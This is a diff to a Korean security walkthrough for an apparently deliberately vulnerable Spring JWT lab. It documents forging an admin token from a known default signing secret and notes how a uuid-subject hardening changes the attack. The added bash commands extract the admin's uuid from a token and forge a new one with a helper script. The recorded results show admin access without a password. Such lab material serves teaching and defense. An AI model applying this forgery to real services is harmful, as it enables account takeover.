@@ -57,23 +57,31 @@ JWT의 안전은 거의 전부 **secret(서명 키) 관리**에 달려 있다. �
 
 > 취약 상태 = `application.properties` 의 기본 secret + `jwt.allow-insecure-secret=true`
 
+> ⚠️ **중요 — 이 브랜치는 방어가 누적된다.** HEAD 에는 **4-2(토큰 subject를 uuid로)** 가 이미 적용돼 있다. 그래서 `jwt_forge.py admin@aa.com`(**email** subject)는 현재 코드에서 **401**로 막힌다 — 이것은 버그가 아니라 **4-2 방어가 작동**하는 것이다(= 4-2 표의 "예전 방식 위조 → 401"). 아래 3-1 은 **현재 코드(HEAD) 기준**으로 재현한다. 4-2 적용 *이전*의 email 위조 성공(200)을 그대로 보려면 그 변경 전 커밋에서 실행한다.
+
 ### 3-1. Secret 유출 → 토큰 위조 → 관리자 탈취 ⭐
 
-`application.properties` 의 secret 은 `secret.getBytes()` 로 쓰이므로, HMAC 키 = **그 문자열의 UTF-8(ASCII) 바이트**다. 이 값만 알면 공격자가 **비밀번호 없이** admin 토큰을 직접 서명할 수 있다.
+`application.properties` 의 secret 은 `secret.getBytes()` 로 쓰이므로, HMAC 키 = **그 문자열의 UTF-8(ASCII) 바이트**다. 이 값만 알면 공격자가 **비밀번호 없이** 유효한 토큰을 직접 서명할 수 있다. 단, HEAD 에서는 subject 가 **uuid** 이므로 **유효한 uuid** 가 필요하다(토큰을 한 번 가로채거나 로그·DB 에서 얻었다고 가정).
 
-`docs/security/jwt_forge.py` (표준 라이브러리만 사용):
 ```bash
 B=http://localhost:8080
-FT=$(python docs/security/jwt_forge.py admin@aa.com)      # admin 토큰 위조
-curl -s -w "\n%{http_code}\n" "$B/api/userinfos/me" -H "Authorization: Bearer $FT"
+# (1) admin 토큰을 한 번 확보해 그 안의 uuid(sub) 를 읽는다 (토큰 탈취 가정)
+RT=$(curl -s -X POST "$B/api/userinfos/login" -H "Content-Type: application/json" \
+  -d '{"email":"admin@aa.com","password":"pwd1"}' | python -c "import sys,json;print(json.load(sys.stdin)['accessToken'])")
+UUID=$(echo "$RT" | cut -d. -f2 | python -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);print(json.loads(base64.urlsafe_b64decode(s))['sub'])")
+echo "admin uuid = $UUID"
+# (2) 알려진 secret + 그 uuid 로 위조 → 비밀번호 없이 admin
+FU=$(python docs/security/jwt_forge.py "$UUID")
+curl -s -w "\n%{http_code}\n" "$B/api/userinfos/me" -H "Authorization: Bearer $FU"
 ```
 **검증 결과** (test 프로파일, 검증됨):
 
 | 요청 | 결과 |
 |---|---|
-| 위조 admin 토큰으로 `/me` | **200** → `{"email":"admin@aa.com","roles":["ROLE_ADMIN","ROLE_USER"]}` 🔴 |
+| 유효 uuid + 알려진 secret 위조 → `/me` | **200** → `{"email":"admin@aa.com","roles":["ROLE_ADMIN",…]}` 🔴 |
+| (참고) `jwt_forge.py admin@aa.com`(email) → `/me` | **401** ✅ (4-2 uuid 방어) |
 
-→ **비밀번호를 몰라도 secret 하나로 관리자 세션을 얻는다.** (roles 는 DB에서 오므로, admin 계정명으로 위조하면 admin 권한을 그대로 획득)
+→ **secret 하나로 유효한 토큰을 찍어낼 수 있다.** uuid 하드닝(4-2) 덕분에 "유효한 uuid" 라는 추가 조건이 붙었지만, **근본 원인은 공개된 secret** 이다. (roles 는 DB에서 오므로, admin 의 uuid 로 위조하면 admin 권한을 그대로 획득)
 
 #### `jwt_forge.py` 는 무엇을 하나 (교육용 위조 스크립트)
 
